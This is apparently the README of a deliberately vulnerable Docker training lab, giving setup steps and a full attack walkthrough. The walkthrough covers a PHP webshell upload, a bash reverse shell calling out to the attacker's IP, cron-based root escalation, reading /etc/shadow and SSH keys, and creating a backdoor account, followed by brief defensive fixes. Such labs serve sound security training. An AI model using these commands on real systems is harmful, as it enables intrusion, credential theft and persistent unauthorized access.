<p align="center">
  <img src="https://img.shields.io/badge/CloudMints-Vulnerable%20Lab-red?style=for-the-badge&logo=docker" alt="CloudMints"/>
  <img src="https://img.shields.io/badge/Docker-Ready-brightgreen?style=for-the-badge&logo=docker"/>
  <img src="https://img.shields.io/badge/Web%20Exploitation-Critical-ff6b6b?style=for-the-badge"/>
</p>

# CloudMints Vulnerable Lab 🚀

> **Intermediate Docker-based Attack Chain Lab**  
> **Duration**: 2-4 hours | **Difficulty**: Intermediate | **Version**: 1.0

## 🎯 Lab Overview
**Complete attack chain**: Default Creds → File Upload RCE → Reverse Shell → Cron Job Priv Esc → Root Post-Exploitation

**Live Targets After Deployment:**
| Endpoint | Credentials | Purpose |
|----------|-------------|---------|
| `http://cloudmints.in` | Public | Main vulnerable site |
| `http://admin.cloudmints.in` | `admin` / `CloudM1ntsAdmin2024!` | Admin panel (File Upload RCE) |

## 🖥️ System Requirements
Hardware: 2+ CPU cores, 4GB+ RAM, 10GB disk

OS: Linux (Ubuntu/Debian/Kali)

Software: Docker 20.10+, sudo access



## 🚀 Complete Deployment Guide

### Step 1: Install Prerequisites (3 min)

```sudo apt update```

```sudo apt install -y docker.io curl wget nmap netcat-openbsd python3```

```sudo systemctl start docker```

```sudo usermod -aG docker $USER # Logout/login after this```



### Step 2: Clone & Setup Lab (2 min)

```Create & enter lab directory```

```git clone https://github.com/Synnefo-Solutions/Cloudmints.git ```

OR download ZIP from GitHub → Extract here

```cd Cloudmints```

```chmod +x setup-cloudmints-lab.sh```

```sudo ./setup-cloudmints-lab.sh```

### Step 3: Verify Deployment

Check containers running

```docker ps | grep cloudmints```

Test websites live

```curl -I http://cloudmints.in``` # Should return 200 OK

```curl -I http://admin.cloudmints.in``` # Should return 200 OK



**✅ Success Output:**

CloudMints Lab - Setup Complete!

Containers: cloudmints-main, cloudmints-admin running

Access: http://cloudmints.in | http://admin.cloudmints.in



## 🔓 Attack Walkthrough

### Phase 1: Initial Access (2 min)

Create & upload PHP webshell

```echo '<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>' > shell.php```

Upload via admin panel (or use curl)

```curl -F "file=@shell.php" http://admin.cloudmints.in/uploads/```

Test RCE

```curl "http://admin.cloudmints.in/uploads/shell.php?cmd=whoami"```

Expected: www-data

### Phase 2: Reverse Shell (1 min)

**Terminal 1 (Attacker):**

```nc -lvnp 9001```


**Terminal 2 (Target):**

```curl "http://admin.cloudmints.in/uploads/shell.php?cmd=bash -i >& /dev/tcp/$(curl -s ifconfig.me)/9001 0>&1"```


**Upgrade shell:**

```python3 -c 'import pty; pty.spawn("/bin/bash")'```

```export TERM=xterm```


### Phase 3: Privilege Escalation (5 min)

Find world-writable root file

```find / -type f -perm -002 -user root 2>/dev/null```

Output: /opt/backup.sh

Check cron job

```cat /etc/cron.d/cloudmints-backup```

Output: */2 * * * * root /opt/backup.sh

Overwrite with SUID bash exploit

```cat > /opt/backup.sh << 'EOF'```

```#!/bin/bash```

```cp /bin/bash /tmp/rootbash```

```chmod +s /tmp/rootbash```

```EOF```

Wait 2 minutes for cron → Get root!

```/tmp/rootbash -p```

```whoami``` # root 🎉


### Phase 4: Post-Exploitation

Dump sensitive files

```cat /etc/shadow```

```cat /root/.ssh/id_rsa```

Create backdoor

```useradd -m -s /bin/bash backdoor```

```echo 'backdoor:Pssw0rd123' | chpasswd```

## 🛠️ Troubleshooting Guide
| Issue | Solution |
|-------|----------|
| **Docker permission denied** | `sudo usermod -aG docker $USER` → relogin |
| **Containers won't start** | `docker system prune -f && sudo ./setup-cloudmints-lab.sh` |
| **Webshell 404** | `docker exec cloudmints-admin ls -la /var/www/html/uploads/` |
| **Reverse shell fails** | `ufw allow 9001` + `curl ifconfig.me` for correct IP |
| **Priv esc doesn't work** | `tail -f /var/log/cron` → wait full 2min cycle |

## 🛡️ Defense Recommendations

Fix 1: Secure backup script

```chmod 750 /opt/backup.sh```

```chown root:root /opt/backup.sh```

Fix 2: Secure uploads directory

```chmod 755 /var/www/html/uploads/```

Add .htaccess: <Files "*.php"> Deny from all </Files>

Fix 3: File integrity monitoring

```apt install aide```

```aide --init```

---

## 7. Included Study Material

Download these resources to help you succeed:

- 📄 [**Pentesting Cheatsheet**](./Docs/Pentesting_Cheatsheet.pdf) – Core pentesting commands and payloads  
- 🗺️ [**Pentester Roadmap**](./Docs/Pentester_Roadmap.pdf) – 12–18 month pentesting career roadmap  
- 📖 [**CloudMints Complete Guide**](./Docs/cloudmints_complete_guide.pdf) – Full, detailed CloudMints lab guide (50+ pages)

---



**⚠️ Educational use only! Do not deploy in production.**

---

**Synnefo Solutions | December 2025**  
